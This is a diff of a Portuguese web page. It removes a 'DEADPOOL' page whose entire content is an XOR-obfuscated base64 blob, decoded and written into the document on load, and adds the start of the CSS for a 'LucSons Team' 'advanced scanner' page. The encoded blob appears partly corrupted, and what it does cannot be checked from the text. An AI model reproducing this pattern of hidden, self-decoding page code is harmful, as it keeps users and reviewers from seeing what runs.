@@ -1,38 +1,590 @@
-<!DOCTYPE html> 
-<html> 
+<!DOCTYPE html>
+<html lang="pt-BR">
 <head>
-    <meta charset="UTF-8">
-    <title>DEADPOOL</title>
-    <link rel="manifest" href="manifest.json">
-    <meta name="theme-color" content="#103010">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-</head> 
-<body> 
-    <script> 
-    (function(){ 
-        // Seu código criptografado original totalmente intacto e sem alterações
-        const encoded = "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XyQiRHVfX19fX18TGgtfFxYLDDMWDAtfQl8kIkR1X19fX19fExoLXxYMLQoRERYRGF9CXxkeEwwaRHVfX19fX18TGgtfHh0QDQs8EBELDRATExoNDF9CXyQiRHVfX19fX18TGgtfCxALHhMvDRAcGgwMGhtfQl9PU18LEAseEzcWCwxfQl9PU18LEAseEzoNDRANDF9CX09EdV9fX19fXxMaC18MCx4NCysWEhpfQl87HgsaUREQCFdWRHVfX19fX18TGgtfHhwLFgkaKBANFBoNDF9CX09EdXVfX19fX18ZChEcCxYQEV8PEx4GOBAeEywQChEbV1ZfBHVfX19fX19fXwsNBl8EdV9fX19fX19fX18cEBEMC18cCwc+ChsWEF9CXxEaCF9XCBYRGxAIUT4KGxYQPBARCxoHC18DA18IFhEbEAhRCBodFBYLPgobFhA8EBELGgcLVldWRHVfX19fX19fX18cEBEMC18EAwcX0JfHAsHPgobFhBRHA0aHgsaMAwcFhMTHgsQDVdWRHVfX19fX19fX18cEBEMC18GB4WEV9CXxwLBz4KGxYQURwNGh4LGjgeFhFXVkR1X19fX19fX19fXxAMHFELBg8aX0JfWAsNFh4RGBMaWER1X19fX19fX19fXxAMHFEZDRoOChoRHAZRDBoLKR4TCho+CysWEhpXSE9PU18cCwc+ChsWEFEcCg0NGhELKxYSGlZEdV9fX19fX19fX18QDBxRGQ0aDgoaERwGUQwaCykeEwoaPgsrFhIaV0ZPT1NfHAsHPgobFhBRHAoNDRoRCysWEhpfVF9PUU5WRHVfX19fX19fX18GB4WEVEYHhYRUQwaCykeEwoaPgsrFhIaV09RTVNfHAsHPgobFhBRHAoNDRoRCysWEhpWRHVfX19fX19fX18GB4WEVEYHhYRURoHDxARGhELFh4TLR4SDysQKR4TCho+CysWEhpXT1FPTlNfHAsHPgobFhBRHAoNDRoRCysWEhpfVF9PUUxWRHVfX19fX19fX17///8="; 
-        const key = 127; 
-        let binary = atob(encoded); 
-        let bytes = new Uint8Array(binary.length); 
-        for (let i = 0; i < binary.length; i++) bytes[i] = binary.charCodeAt(i) ^ key; 
-        const decoder = new TextDecoder(); 
-        let result = decoder.decode(bytes); 
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover" />
+<title>🔥 LucSons Team | Scanner Avançado 🏆</title>
+<style>
+@import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@400;600;900&display=swap');
 
-        document.open(); 
-        document.write(result); 
-        document.close(); 
-    })(); 
-    </script> 
+:root {
+  --neon-fire: #ff3c00;       /* Vermelho fogo luminoso */
+  --dark-fire: #5e0000;       /* Vermelho escuro */
+  --border-glow: #ffea00;     /* Amarelo brilhante neon */
+  --bg-dark: #120202;         /* Fundo quase preto avermelhado */
+  --card-bg: #240606;         /* Fundo dos cartões */
+  --text-light: #ffebec;      /* Texto claro */
+  --text-warm: #ffb3a3;       /* Destaques quentes */
+}
 
-    <script>
-        if ('serviceWorker' in navigator) {
-            window.addEventListener('load', () => {
-                navigator.serviceWorker.register('sw.js')
-                .then(reg => console.log('PWA carregado com sucesso!', reg))
-                .catch(err => console.log('Erro ao carregar PWA:', err));
-            });
-        }
-    </script>
-</body> 
+* {
+  margin: 0;
+  padding: 0;
+  box-sizing: border-box;
+}
+
+body {
+  background: var(--bg-dark);
+  font-family: 'Orbitron', monospace;
+  color: var(--text-light);
+  overflow-x: hidden;
+  /* Configuração do Plano de Fundo com sua imagem */
+  background-image: 
+    radial-gradient(circle at 50% 50%, rgba(255, 60, 0, 0.1) 0%, transparent 70%),
+    linear-gradient(rgba(18, 2, 2, 0.9), rgba(18, 2, 2, 0.9)),
+    url('fundo.jpg');
+  background-attachment: fixed;
+  background-size: cover;
+  background-position: center;
+}
+
+/* BANNER SUPERIOR - INTEGRADO COM A SUA IMAGEM */
+.copa-banner {
+  width: 100%;
+  background: #120202;
+  display: flex;
+  justify-content: center;
+  overflow: hidden;
+  box-shadow: 0 8px 25px rgba(0,0,0,0.8), 0 0 15px var(--neon-fire);
+  border-bottom: 4px solid var(--neon-fire);
+}
+.copa-banner img {
+  width: 100%;
+  max-height: 180px;
+  object-fit: cover;
+  object-position: center 40%;
+  display: block;
+}
+
+.main-content {
+  padding: 20px 25px 40px 25px;
+  max-width: 1400px;
+  margin: 0 auto;
+}
+
+#logoContainer {
+  margin: 15px auto 10px auto;
+  width: 110px;
+  height: 110px;
+  filter: drop-shadow(0 0 12px var(--neon-fire));
+  background: radial-gradient(circle, rgba(255, 60, 0, 0.25) 0%, rgba(0,0,0,0) 80%);
+  border-radius: 60px;
+  padding: 8px;
+}
+.handshake-icon {
+  width: 100%;
+  height: 100%;
+  fill: none;
+  stroke: var(--neon-fire);
+  stroke-width: 2.5;
+  stroke-linejoin: round;
+  stroke-linecap: round;
+}
+
+/* Título LucSons Team com efeito de fogo/neon luminoso nas bordas */
+h1 {
+  font-size: 2.8rem;
+  font-weight: 900;
+  text-align: center;
+  margin: 0 0 25px 0;
+  text-transform: uppercase;
+  letter-spacing: 4px;
+  color: #ffffff;
+  text-shadow: 
+    0 0 5px #fff, 
+    0 0 12px var(--neon-fire), 
+    0 0 22px var(--neon-fire), 
+    0 0 42px var(--dark-fire);
+}
+
+label {
+  display: block;
+  margin-top: 22px;
+  margin-bottom: 8px;
+  font-weight: 900;
+  font-size: 1.15rem;
+  color: var(--text-warm);
+  text-shadow: 0 0 8px rgba(255, 60, 0, 0.6);
+  letter-spacing: 1px;
+}
+
+/* Inputs com bordas de fogo luminoso */
+input[type="text"],
+input[type="number"],
+input[type="file"],
+select {
+  background: #1c0505;
+  border: 2px solid var(--neon-fire);
+  border-radius: 12px;
+  color: var(--text-light);
+  font-family: 'Orbitron', monospace;
+  font-size: 1rem;
+  padding: 14px 22px;
+  width: 100%;
+  max-width: 620px;
+  box-shadow: 0 0 8px rgba(255, 60, 0, 0.2), inset 0 0 8px rgba(0,0,0,0.7);
+  transition: all 0.3s ease;
+}
+input:focus, select:focus {
+  border-color: var(--border-glow);
+  box-shadow: 0 0 18px var(--border-glow), inset 0 0 5px rgba(255, 60, 0, 0.3);
+  outline: none;
+  background: #2b0909;
+}
+
+/* Botões temáticos de fogo */
+button {
+  margin-top: 25px;
+  margin-right: 15px;
+  padding: 14px 28px;
+  font-weight: 900;
+  font-family: 'Orbitron', monospace;
+  font-size: 1.1rem;
+  text-transform: uppercase;
+  letter-spacing: 2px;
+  background: linear-gradient(145deg, #5e0000, #9e1200);
+  border: 2px solid var(--neon-fire);
+  color: #ffffff;
+  border-radius: 12px;
+  cursor: pointer;
+  box-shadow: 0 0 10px rgba(255, 60, 0, 0.4);
+  transition: 0.2s ease-in-out;
+}
+button:hover:not(:disabled) {
+  transform: translateY(-2px);
+  background: linear-gradient(145deg, #9e1200, #ff3c00);
+  box-shadow: 0 0 20px var(--border-glow);
+}
+button:disabled {
+  background: #261313;
+  border-color: #4f2323;
+  box-shadow: none;
+  color: #805252;
+  cursor: not-allowed;
+}
+
+#progressContainer {
+  margin-top: 35px;
+  border: 2px solid var(--neon-fire);
+  border-radius: 16px;
+  padding: 20px 28px;
+  background: rgba(36, 6, 6, 0.9);
+  box-shadow: 0 0 20px rgba(255, 60, 0, 0.3);
